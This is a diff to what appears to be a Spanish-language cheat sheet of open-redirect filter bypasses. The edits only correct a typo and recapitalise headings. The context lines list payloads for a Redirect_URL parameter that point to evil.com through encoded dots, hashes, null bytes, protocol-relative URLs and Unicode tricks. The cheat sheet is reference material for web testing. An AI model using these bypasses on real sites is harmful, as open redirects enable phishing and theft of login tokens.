@@ -9,7 +9,7 @@ _____________________________________________________________
 ?Redirect_URL=https://evil.com
 
 
-::. Evadir Filtro cuando el Protocolo está en la Lista Legra mediante // .::
+::. Evadir Filtro cuando el Protocolo está en la Lista Negra mediante // .::
 ?Redirect_URL=//evil.com
 
 
@@ -31,7 +31,7 @@ _____________________________________________________________
 ?Redirect_URL=target.comevil.com
 
 
-::. Evadir Filtro si Sólo Comprueba si el Nombre de Dominio Utiliza un punto => %2e .::
+::. Evadir Filtro si Sólo Comprueba si el Nombre de Dominio Utiliza un PUNTO => %2e .::
 ?Redirect_URL=target.com%2eevil.com
 
 
@@ -39,11 +39,11 @@ _____________________________________________________________
 ?Redirect_URL=evil.com?target.com
 
 
-::. Evadir Filtro si Sólo Comprueba si el Nombre de Dominio Utiliza un hash # => %23 .::
+::. Evadir Filtro si Sólo Comprueba si el Nombre de Dominio Utiliza un HASH # => %23 .::
 ?Redirect_URL=evil.com%23target.com
 
 
-::. Evadir Filtro usando el símbolo º .::
+::. Evadir Filtro usando el Símbolo º .::
 ?Redirect_URL=target.com/ºevil.com
 
 
@@ -52,6 +52,6 @@ _____________________________________________________________
 ?Redirect_URL=evil.com%E3%80%82%23target.com
 
 
-::. Evadir Filtro si sólo Permite Controlar la Ruta Mediante un Nullbyte => %0d ó %0a .::
+::. Evadir Filtro si sólo Permite Controlar la Ruta Mediante un NULLBYTE => %0d ó %0a .::
 ?Redirect_URL=target.com/%0d/evil.com
 ?Redirect_URL=target.com/%0a/evil.com
